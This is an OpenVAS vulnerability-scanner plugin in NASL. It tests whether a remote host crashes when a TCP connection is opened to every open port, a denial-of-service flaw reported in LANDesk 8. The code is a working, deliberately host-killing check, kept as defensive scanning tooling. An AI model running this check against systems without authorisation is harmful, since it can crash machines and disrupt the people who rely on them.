# OpenVAS Vulnerability Test
# $Id: open_all_ports_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: connect to all open ports
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2004 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the remote system by connecting
to every open port.
This is known to bluescreen machines running LANDesk8
(In this case, connecting to two ports is enough)";

tag_solution = "inform your software vendor(s) and patch your system";

# References:
# From: Ryan Rounkles <ryan.rounkles@gmail.com>
# To: vuln-dev@securityfocus.com
# Date: Tue, 19 Oct 2004 09:39:46 -0700
# Subject: Denial of service in LANDesk 8

if(description)
{
 script_id(15571);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_tag(name:"risk_factor", value:"High");
 name = "connect to all open ports";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Crashes the machine by connecting to all open ports";
 script_summary(summary);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright("This script is Copyright (C) 2004 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_keys("Settings/ThoroughTests");
 # script_require_ports("Services/msrdp", 3389);
# The original advisory says that we can crash the machine by connecting to
# LANDesk8 (which port is it?) and RDP simultaneously.
# I modified the attack, just in case
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include('global_settings.inc');

if ( ! thorough_tests ) exit(0);

start_denial();

i = 0;
ports = get_kb_list("Ports/tcp/*");
if(isnull(ports))exit(0);

foreach port (keys(ports))
{
 p = int(port - "Ports/tcp/");
 if (get_port_state(p))
  {
    s[i] = open_sock_tcp(p);
    if (s[i]) i ++;
  }
}


if ( i == 0 ) exit(0);
# display(i, " ports were open\n");

alive = end_denial();

if(!alive)
{
  security_hole(port);
  set_kb_item(name:"Host/dead", value:TRUE);
  exit(0);
}

for (j = 0; j < i; j ++)
  close(s[j]);
